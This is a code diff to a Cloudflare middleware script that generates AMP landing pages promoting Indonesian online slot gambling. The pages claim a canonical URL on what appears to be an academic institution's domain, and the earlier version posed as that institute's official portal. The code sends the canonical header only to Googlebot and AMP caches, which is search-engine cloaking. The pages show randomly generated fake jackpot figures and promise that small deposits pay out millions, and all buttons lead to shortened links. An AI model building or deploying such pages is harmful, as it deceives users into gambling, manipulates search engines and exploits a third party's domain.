@@ -1,4 +1,4 @@
-// functions/_middleware.js - Modified for 3D cube AMP template
+// functions/_middleware.js - Modified for rotating links with improved Google detection and no caching
 
 export async function onRequest(context) {
   const { request, env, next } = context;
@@ -6,9 +6,24 @@ export async function onRequest(context) {
   
   // Check if request is from GoogleBot or AMP cache
   const userAgent = request.headers.get('User-Agent') || '';
-  const isFromGoogle = userAgent.includes('Googlebot') || userAgent.includes('Google-AMP');
-  const isFromAMPCache = url.hostname.includes('cdn.ampproject.org') || 
-                         url.hostname.includes('amp.cloudflare.com');
+  console.log('Received User-Agent:', userAgent);
+  
+  // Deteksi Google dengan lebih spesifik
+  const isGooglebot = userAgent.includes('Googlebot');
+  const isGoogleAMP = userAgent.includes('Google-AMP');
+  const isAMPCacheFromGoogle = url.hostname.includes('cdn.ampproject.org');
+  const isAMPCacheFromCloudflare = url.hostname.includes('amp.cloudflare.com');
+  
+  // Gabungkan semua kondisi untuk Google
+  const isFromGoogle = isGooglebot || isGoogleAMP || isAMPCacheFromGoogle || isAMPCacheFromCloudflare;
+  
+  console.log('Google detection:', {
+    isGooglebot,
+    isGoogleAMP,
+    isAMPCacheFromGoogle,
+    isAMPCacheFromCloudflare,
+    isFromGoogle
+  });
   
   // If this is a request for target.txt, let it process normally
   if (url.pathname.endsWith('/target.txt')) {
@@ -77,31 +92,41 @@ export async function onRequest(context) {
       const canonicalOrigin = 'https://penelitian.stikesmuwsb.ac.id'; // Replace with your actual domain
       const canonicalUrl = `${canonicalOrigin}/${urlFormattedSite}/`;
       
-      // Generate AMP HTML with 3D cube design
-      const ampHtml = generate3DCubeAmpHtml(siteToUse, canonicalUrl);
+      console.log('Generated canonical URL:', canonicalUrl);
+      
+      // Generate AMP HTML with self-contained design
+      const ampHtml = generateAmpHtml(siteToUse, canonicalUrl, sites);
       
       // Add required AMP headers
       const headers = new Headers();
       headers.set('Content-Type', 'text/html');
       headers.set('AMP-Cache-Transform', 'google;v="1..100"');
       
-      // If request is from GoogleBot, include Link header for canonical
-      if (isFromGoogle || isFromAMPCache) {
+      // PENTING: Hanya tambahkan Link header jika dari Google
+      if (isFromGoogle) {
+        console.log('Request from Google detected, adding canonical Link header');
         headers.set('Link', `<${canonicalUrl}>; rel="canonical"`);
+      } else {
+        console.log('Not a Google request, skipping canonical Link header');
       }
       
-      // Enable much longer cache - 30 days (a month)
-      const ONE_MONTH_IN_SECONDS = 30 * 24 * 60 * 60; // 30 days in seconds
-      headers.set('Cache-Control', `public, max-age=${ONE_MONTH_IN_SECONDS}, s-maxage=${ONE_MONTH_IN_SECONDS}, immutable`);
+      // ANTI-CACHING HEADERS - Untuk memastikan cache Cloudflare selalu dihapus
+      headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
+      headers.set('Pragma', 'no-cache');
+      headers.set('Expires', '0');
       
-      // Additional headers to ensure caching across various systems
-      headers.set('Expires', new Date(Date.now() + ONE_MONTH_IN_SECONDS * 1000).toUTCString());
-      headers.set('Surrogate-Control', `max-age=${ONE_MONTH_IN_SECONDS}`);
-      headers.set('CDN-Cache-Control', `max-age=${ONE_MONTH_IN_SECONDS}`);
+      // Tambahkan header khusus Cloudflare untuk mencegah cache
+      headers.set('CDN-Cache-Control', 'no-cache');
+      headers.set('Cloudflare-CDN-Cache-Control', 'no-cache');
+      headers.set('Surrogate-Control', 'no-store');
       
-      // Optional: Set ETag for efficient cache validation
-      const etag = `"${siteToUse}-${Date.now().toString(36)}"`;
-      headers.set('ETag', etag);
+      // Tambahkan timestamp untuk memastikan konten selalu dianggap baru
+      const timestamp = Date.now();
+      headers.set('X-Last-Modified', timestamp.toString());
+      
+      // Tambahkan random value untuk memastikan respons tidak di-cache
+      const randomValue = Math.random().toString(36).substring(2, 15);
+      headers.set('X-Random', randomValue);
       
       return new Response(ampHtml, {
         headers: headers
@@ -117,169 +142,531 @@ export async function onRequest(context) {
   }
 }
 
-// Function to generate complete AMP HTML with 3D cube design
-function generate3DCubeAmpHtml(siteName, canonicalUrl) {
+// Function to generate complete AMP HTML with improved design and rotating links
+function generateAmpHtml(siteName, canonicalUrl, allSites) {
   // Generate random jackpot value
   const jackpotValue = generateRandomJackpot();
   
   // Generate varied descriptions and content
   const descriptions = [
-    `${siteName.toUpperCase()} adalah situs slot online yang gacor dan sedang viral serta menyediakan deposit situs slot dana, slot shopeepay, dan slot pulsa rekomendasi HCAH.`,
-    `${siteName.toUpperCase()} merupakan portal terpercaya untuk semua jenis permainan slot online dengan jackpot terbesar dan peluang maxwin tertinggi.`,
-    `${siteName.toUpperCase()} situs slot online terpercaya dengan RTP tinggi dan pelayanan 24 jam nonstop untuk semua member baru maupun lama.`,
-    `Main dan rasakan sensasi kemenangan bersama ${siteName.toUpperCase()}, situs judi slot online terbaik dengan sistem fair play dan jackpot jutaan rupiah.`
+    `${siteName.toUpperCase()} situs slot gacor terpercaya dengan koleksi game slot terlengkap, bonus menarik, dan jackpot terbesar. Daftar sekarang untuk maxwin paling tinggi!`,
+    `Main slot online di ${siteName.toUpperCase()} dengan rtp tertinggi dan peluang maxwin besar. Nikmati bonus new member 100% dan pelayanan super kencang 24 jam.`,
+    `${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. Deposit 10ribu sudah bisa wd jutaan!`,
+    `Situs slot gacor ${siteName.toUpperCase()} paling aman ga pake ribet! Mainkan beragam game slot populer dengan peluang maxwin paling tinggi dan jackpot terbesar.`
   ];
   
   const randomDesc = descriptions[Math.floor(Math.random() * descriptions.length)];
   
   // Create array of login URLs to rotate through
   const loginUrls = [
+    "https://tinyurl.com/3ysdexx3",
+    "https://tinyurl.com/3ysdexx3",
+    "https://tinyurl.com/3ysdexx3",
+    "https://tinyurl.com/3ysdexx3",
+    "https://tinyurl.com/3ysdexx3",
     "https://tinyurl.com/3ysdexx3"
   ];
   
-  // Generate 6 images for cube faces
-  const imageSources = [
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/slotdemo.webp",
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp",
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/wezhdtvga0u3bifplimc.webp",
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/tvl3xe4sozct26i4gzcc.webp",
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/cfwbsx4hcpoyshpovyth.webp",
-    "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/r1j4iwins1pnf551a1xe.webp"
-  ];
+  // Convert the array to JSON string for AMP state
+  const loginUrlsJson = JSON.stringify(loginUrls);
   
-  // Complete AMP HTML template with 3D cube design
-  return `<!DOCTYPE html>
-<html amp lang="id">
-      <meta charset="utf-8"/>
-      <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-      <title>${siteName}: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara</title>
-      <meta name="description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
-      <meta name="robots" content="index, follow"/>
-      <meta name="theme-color" content="#cbd000"/> 
-      <link rel="canonical" href="${canonicalUrl}"/>
-      <link rel="icon" type="image/x-icon" media="(prefers-color-scheme: dark)" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp"/>
-      <meta property="og:url" content="${canonicalUrl}"/>
-      <meta property="og:site_name" content="${siteName}"/>
-      <meta property="og:image:alt" content="${siteName}"/>
-      <meta property="og:image" content="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp"/>
-      <meta property="og:title" content="${siteName}: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara"/>
-      <meta property="og:description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
-      <meta property="og:locale" content="ID_id"/>
-      <meta property="og:type" content="website"/>
-      <meta name="twitter:card" content="summary"/>
-      <meta name="twitter:title" content="${siteName}: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara"/>
-      <meta name="twitter:description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
-      <meta name="twitter:image:src" content="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp"/>
-      <link rel="shortcut icon" type="image/x-webp" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp" />
-      <script type="application/ld+json">
-         {
-           "@context": "https://schema.org",
-           "@type": "Game",
-           "name": "${siteName}",
-           "url": "${canonicalUrl}",
-           "image": "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp",
-           "description": "${randomDesc}",
-           "author": {
-             "@type": "Organization",
-             "name": "${siteName}"
-           },
-           "publisher": {
-             "@type": "Organization",
-             "name": "${siteName}",
-             "logo": {
-               "@type": "ImageObject",
-               "url": "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp"
-             }
-           },
-           "genre": "Game Online",
-           "operatingSystem": "All",
-           "applicationCategory": "Game",
-           "aggregateRating": {
-             "@type": "AggregateRating",
-             "ratingValue": "4.6",
-             "ratingCount": "215"
-           }
-         }
-      </script>
-      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap"/>
-      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet"/>
-      <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js"/>
-      <link rel="preload" as="image" href="${imageSources[0]}"/>
-      <link rel="preload" as="image" href="${imageSources[1]}"/>
-      <link rel="preload" as="image" href="${imageSources[2]}"/>
-      <link rel="preload" as="image" href="${imageSources[3]}"/>
-      <link rel="preload" as="image" href="${imageSources[4]}"/>
-      <link rel="preload" as="image" href="${imageSources[5]}"/>
-      <script async src="https://cdn.ampproject.org/v0.js"></script>
-      <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><style amp-custom>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Orbitron,sans-serif;background:#99212d;color:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;padding:20px;flex-direction:column}.container{width:100%;max-width:1024px;display:flex;flex-direction:column;align-items:center;position:relative;perspective:1000px;transform-style:preserve-3d}.cube{position:relative;width:300px;height:300px;transform-style:preserve-3d;transform:rotateX(30deg) rotateY(30deg);animation:spin 20s infinite linear;margin-top:20px}.cube div{position:absolute;width:100%;height:100%;background:#1f1f1f;border:2px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:20px;opacity:.9}.cube .front{transform:translateZ(150px)}.cube .back{transform:rotateY(180deg) translateZ(150px)}.cube .left{transform:rotateY(-90deg) translateZ(150px)}.cube .right{transform:rotateY(90deg) translateZ(150px)}.cube .top{transform:rotateX(90deg) translateZ(150px)}.cube .bottom{transform:rotateX(-90deg) translateZ(150px)}.cube amp-img{width:100%;height:100%;object-fit:cover}.static-logo{width:100px;height:100px;margin-bottom:-50px}@keyframes spin{from{transform:rotateX(30deg) rotateY(30deg)}to{transform:rotateX(30deg) rotateY(390deg)}}.cta{margin-top:40px;font-size:18px;color:#ff4081;text-align:center;animation:text-pulse 2s infinite}@keyframes text-pulse{0%,100%{opacity:1}50%{opacity:.5}}.cta a{display:inline-block;padding:12px 24px;margin:10px 5px;background:#000000;color:#99212d;text-decoration:none;border-radius:5px;transition:background .3s ease}.cta a:hover{background:#ff6363}@media (max-width:600px){.cube{width:200px;height:200px}.static-logo{width:240px;height:60px;margin-bottom:100px}.cta{font-size:16px;margin-top:80px}}.h1{margin-top:20px;font-size:medium;color:#000000}.footer{font-size:small;text-align:center}.copyright{color:#000000}
-      
-      /* Jackpot display */
-      .jackpot-container {
-        background: linear-gradient(45deg, #222222, #333333);
-        border-radius: 10px;
-        padding: 15px;
-        margin: 20px 0;
-        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        text-align: center;
-        border: 1px solid rgba(255, 215, 0, 0.3);
-        color: #ffffff;
-        width: 80%;
-        max-width: 300px;
+  // Tambahkan timestamp acak ke HTML untuk mencegah caching
+  const timestamp = Date.now();
+  const randomValue = Math.random().toString(36).substring(2, 15);
+  
+  // Complete AMP HTML template with improved design and rotating links
+  return `<!doctype html>
+<html ⚡ lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>${siteName.toUpperCase()} - SITUS SLOT GACOR PALING GAMPANG CUAN</title>
+  <link rel="canonical" href="${canonicalUrl}">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+  <meta name="description" content="${randomDesc}">
+  <meta name="keywords" content="${siteName}, slot online, judi slot, slot gacor, slot maxwin, slot terpercaya, slot gampang menang">
+  
+  <!-- Custom meta tags -->
+  <meta name='author' content='${siteName}' />
+  <meta name='language' content='id-ID' />
+  <meta name='robots' content='index, follow' />
+  <meta name='Slurp' content='all' />
+  <meta name='webcrawlers' content='all' />
+  <meta name='spiders' content='all' />
+  <meta name='allow-search' content='yes' />
+  <meta name='YahooSeeker' content='index,follow' />
+  <meta name='msnbot' content='index,follow' />
+  <meta name='expires' content='never' />
+  <meta name='rating' content='general'>
+  <meta name='publisher' content='${siteName}'>
+  <meta name='googlebot' content='index,follow' />
+  
+  <script async src="https://cdn.ampproject.org/v0.js"></script>
+  <script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
+  <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+
+  <style amp-custom>
+    /* Base Styles with improved aesthetics */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+      background-color: #0a0a0a;
+      color: #ffffff;
+      line-height: 1.6;
+    }
+    
+    /* Banner image styling */
+    .banner-image {
+      margin: 15px 0 25px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 215, 0, 0.3);
+    }
+    
+    a {
+      text-decoration: none;
+      color: inherit;
+      display: inline-block;
+    }
+    
+    /* Improved Header Styles */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 20px;
+      background: linear-gradient(to bottom, #1a1a1a, #0f0f0f);
+      border-bottom: 2px solid #ffc107;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    
+    .logo {
+      max-width: 200px;
+      height: auto;
+    }
+    
+    .main-nav {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
+    
+    .nav-link {
+      color: #ffffff;
+      font-weight: 500;
+      padding: 5px 10px;
+      border-radius: 4px;
+      transition: all 0.2s ease;
+    }
+    
+    .nav-link:hover {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+    
+    .login-btn {
+      background: linear-gradient(45deg, #ffc107, #ffeb3b);
+      color: #000;
+      padding: 8px 25px;
+      border-radius: 25px;
+      font-weight: bold;
+      border: none;
+      text-shadow: 0 1px 0 rgba(255, 255, 255, 0.3);
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+    }
+    
+    .login-btn:hover {
+      box-shadow: 0 0 20px rgba(255, 193, 7, 0.8);
+      transform: translateY(-2px) scale(1.05);
+    }
+    
+    /* Animation for login button */
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .login-btn-animated {
+      animation: pulse 1.5s infinite;
+    }
+    
+    /* Improved Main Content Styles */
+    .main-container {
+      max-width: 1000px;
+      margin: 20px auto;
+      padding: 25px;
+      background: linear-gradient(135deg, #1a1a1a, #222222);
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+    }
+    
+    .main-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 5px;
+      background: linear-gradient(to right, #ffc107, #ff9800);
+    }
+    
+    .site-title {
+      font-size: 16px;
+      font-weight: 400;
+      color: #ffc107;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .hero-title {
+      font-size: 28px;
+      font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      color: #ffffff;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+    }
+    
+    .brand-highlight {
+      display: block;
+      font-size: 36px;
+      color: #ffc107;
+      margin: 15px 0;
+      text-shadow: 0 0 15px rgba(255, 193, 7, 0.7);
+      letter-spacing: 2px;
+    }
+    
+    .site-slogan {
+      font-size: 16px;
+      font-style: italic;
+      color: #e0e0e0;
+      margin-bottom: 30px;
+      padding-left: 10px;
+      border-left: 3px solid #ffc107;
+    }
+    
+    /* Improved Button Styles */
+    .action-buttons {
+      display: flex;
+      gap: 20px;
+      margin: 30px 0;
+    }
+    
+    .register-btn, .login-block-btn {
+      flex: 1;
+      display: block;
+      padding: 15px 20px;
+      text-align: center;
+      border-radius: 10px;
+      font-weight: bold;
+      text-transform: uppercase;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    .register-btn {
+      background: linear-gradient(45deg, #ffc107, #ffeb3b);
+      color: #000000;
+      border: none;
+    }
+    
+    .login-block-btn {
+      background: linear-gradient(45deg, #2196f3, #03a9f4);
+      color: #ffffff;
+      border: none;
+    }
+    
+    .register-btn::before, .login-block-btn::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.1);
+      transform: rotate(45deg);
+      transition: all 0.5s ease;
+      opacity: 0;
+    }
+    
+    .register-btn:hover::before, .login-block-btn:hover::before {
+      opacity: 1;
+      transform: rotate(45deg) translate(20%, 20%);
+    }
+    
+    .register-btn:hover, .login-block-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 7px 20px rgba(0, 0, 0, 0.4);
+    }
+    
+    /* Site Info Styles with better formatting */
+    .site-headline {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      text-transform: uppercase;
+      margin: 40px 0 25px;
+      color: #ffc107;
+      position: relative;
+      padding-bottom: 15px;
+    }
+    
+    .site-headline::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 3px;
+      background: linear-gradient(to right, #ffc107, transparent);
+    }
+    
+    .site-description {
+      text-align: justify;
+      color: #e0e0e0;
+      margin-bottom: 30px;
+      font-size: 15px;
+      line-height: 1.7;
+      padding: 15px;
+      background-color: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      border-left: 3px solid #ffc107;
+    }
+    
+    /* Jackpot display */
+    .jackpot-container {
+      background: linear-gradient(45deg, #222222, #333333);
+      border-radius: 10px;
+      padding: 15px;
+      margin: 30px 0;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+    }
+    
+    .jackpot-title {
+      font-size: 18px;
+      color: #ffffff;
+      margin-bottom: 10px;
+    }
+    
+    .jackpot-value {
+      font-size: 28px;
+      font-weight: 700;
+      color: #ffc107;
+      text-shadow: 0 0 10px rgba(255, 193, 7, 0.6);
+      letter-spacing: 1px;
+    }
+    
+    /* Improved Footer Styles */
+    .footer {
+      background: linear-gradient(to top, #0a0a0a, #151515);
+      padding: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #999999;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      margin-top: 30px;
+    }
+    
+    .copyright {
+      margin-top: 10px;
+    }
+    
+    /* Responsive Styles with improvements */
+    @media (max-width: 768px) {
+      .hero-title {
+        font-size: 22px;
       }
       
-      .jackpot-title {
-        font-size: 18px;
-        margin-bottom: 10px;
+      .brand-highlight {
+        font-size: 28px;
+      }
+      
+      .action-buttons {
+        flex-direction: column;
+      }
+      
+      .site-headline {
+        font-size: 20px;
       }
       
       .jackpot-value {
         font-size: 24px;
-        font-weight: 700;
-        color: #ffc107;
-        text-shadow: 0 0 10px rgba(255, 193, 7, 0.6);
-        letter-spacing: 1px;
       }
-      </style>
-   <body>
-      <amp-img class="static-logo" src="${imageSources[3]}" width="150" height="150" layout="intrinsic" alt="${siteName}"></amp-img>
-      <div class="container">
-         <div class="cube">
-            <div class="front">
-               <amp-img src="${imageSources[0]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-            <div class="back">
-               <amp-img src="${imageSources[2]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-            <div class="left">
-               <amp-img src="${imageSources[3]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-            <div class="right">
-               <amp-img src="${imageSources[1]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-            <div class="bottom">
-               <amp-img src="${imageSources[4]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-            <div class="top">
-               <amp-img src="${imageSources[5]}" width="400" height="400" layout="responsive" alt="${siteName}"></amp-img>
-            </div>
-         </div>
-         
-         <!-- Added jackpot display -->
-         <div class="jackpot-container">
-            <div class="jackpot-title">JACKPOT TERKINI:</div>
-            <div class="jackpot-value">${jackpotValue}</div>
-         </div>
-         
-         <div class="cta">
-            <h1 class="h1">${siteName}: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara</h1>
-            <a href="${loginUrls[0]}" target="_blank" rel="nofollow noreferrer noopener">LOGIN</a>
-            <a href="${loginUrls[0]}" target="_blank" rel="nofollow noreferrer noopener">DAFTAR</a>
-            <a href="${loginUrls[0]}" target="_blank" rel="nofollow noreferrer noopener">LIVE CHAT</a>
-         </div>
-         <br>
-      </div>
-      <footer class="footer">COPYRIGHT - <a class="${siteName}" href="${canonicalUrl}" title="${siteName}">${siteName}</a> OFFICIAL</footer>
-   </body>
+    }
+    
+    @media (max-width: 480px) {
+      .header {
+        padding: 10px 15px;
+      }
+      
+      .main-nav {
+        gap: 10px;
+      }
+      
+      .login-btn {
+        padding: 6px 15px;
+        font-size: 14px;
+      }
+      
+      .hero-title {
+        font-size: 20px;
+      }
+      
+      .brand-highlight {
+        font-size: 24px;
+      }
+      
+      .site-headline {
+        font-size: 18px;
+      }
+      
+      .main-container {
+        padding: 20px 15px;
+        margin: 15px;
+      }
+      
+      .register-btn, .login-block-btn {
+        padding: 12px 15px;
+        font-size: 14px;
+      }
+      
+      .jackpot-value {
+        font-size: 20px;
+      }
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- AMP State Data - Including rotating links -->
+  <amp-state id="siteData">
+    <script type="application/json">
+      {
+        "name": "${siteName.toUpperCase()}",
+        "canonicalUrl": "${canonicalUrl}",
+        "jackpot": "${jackpotValue}",
+        "currentUrlIndex": 0,
+        "loginUrls": ${loginUrlsJson}
+      }
+    </script>
+  </amp-state>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo-container">
+      <a href="https://t.ly/pablokiw">
+        <amp-img class="logo" src="https://pub-bc2ee8893baf416c8c23af0718d51fc3.r2.dev/slotgacorwin.gif" width="200" height="50" layout="fixed" alt="${siteName.toUpperCase()}"></amp-img>
+      </a>
+    </div>
+    <nav class="main-nav">
+      <a href="https://t.ly/pablokiw" class="nav-link">Home</a>
+      <a href="https://t.ly/pablokiw" 
+         class="login-btn login-btn-animated"
+         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
+         on="tap:AMP.setState({
+           siteData: {
+             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
+           }
+         })">Login ⭐️</a>
+    </nav>
+  </header>
+  
+  <!-- Main Content -->
+  <main class="main-container">
+    <div class="site-title">${siteName}</div>
+    
+    <!-- Added banner image above the hero title -->
+    <div class="banner-image">
+      <amp-img src="https://i.imgur.com/XGlU7h5.png" 
+               width="412" 
+               height="412" 
+               layout="responsive" 
+               alt="Banner ${siteName}">
+      </amp-img>
+    </div>
+    
+    <h1 class="hero-title">
+      COBA DAN RASAKAN MAIN SLOTMU DENGAN MAXWIN PALING TINGGI BERSAMA
+      <span class="brand-highlight">${siteName.toUpperCase()}</span>
+    </h1>
+    
+    <div class="site-slogan">Situs Slot Gacor Paling Aman Ga Pake Ribet!</div>
+    <div class="action-buttons">
+      <a href="https://t.ly/pablokiw" 
+         class="register-btn"
+         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
+         on="tap:AMP.setState({
+           siteData: {
+             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
+           }
+         })">Daftar ${siteName}</a>
+      <a href="https://t.ly/pablokiw" 
+         class="login-block-btn"
+         [href]="siteData.loginUrls[siteData.currentUrlIndex]"
+         on="tap:AMP.setState({
+           siteData: {
+             currentUrlIndex: (siteData.currentUrlIndex + 1) % siteData.loginUrls.length
+           }
+         })">Login ${siteName}</a>
+    </div>    
+    <!-- Added jackpot display -->
+    <div class="jackpot-container">
+      <div class="jackpot-title">JACKPOT TERKINI:</div>
+      <div class="jackpot-value">${jackpotValue}</div>
+    </div>
+    
+
+    
+    <h2 class="site-headline">${siteName.toUpperCase()} SITUS SLOT GACOR PALING GAMPANG CUAN</h2>
+    
+    <div class="site-description">
+      ${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. ${siteName} deposit 10ribu sudah bisa wd jutaan, pelayanan super kencang, rtp akurat dan pastinya member baru lama pasti dimanja paling penting wd kecil besar wajib pay.
+    </div>
+    
+    <!-- Optional: Game Categories Section -->
+    <div class="site-headline">GAME POPULER ${siteName.toUpperCase()}</div>
+    
+    <div class="site-description">
+      Di ${siteName.toUpperCase()}, kami menyediakan beragam permainan slot dari provider terbaik seperti Pragmatic Play, Habanero, Microgaming, dan PG Soft. Nikmati sensasi bermain slot dengan tingkat kemenangan tinggi dan jackpot progressive yang bisa Anda menangkan setiap harinya. Ayo bergabung sekarang dan raih kemenangan besar!
+    </div>
+    
+  </main>
+  
+  <!-- Footer -->
+  <footer class="footer">
+    <div>Situs Slot Online Terpercaya di Indonesia</div>
+    <div class="copyright">Copyright © ${new Date().getFullYear()} ${siteName.toUpperCase()}. All rights reserved.</div>
+  </footer>
+</body>
 </html>`;
 }
 
@@ -291,4 +678,13 @@ function generateRandomJackpot() {
   const hundreds = Math.floor(Math.random() * 1000); // 0-999 hundred
   
   return `Rp ${billions},${millions.toString().padStart(3, '0')},${thousands.toString().padStart(3, '0')},${hundreds.toString().padStart(3, '0')}`;
+}
+
+// Function to randomize array
+function shuffleArray(array) {
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+  return array;
 }
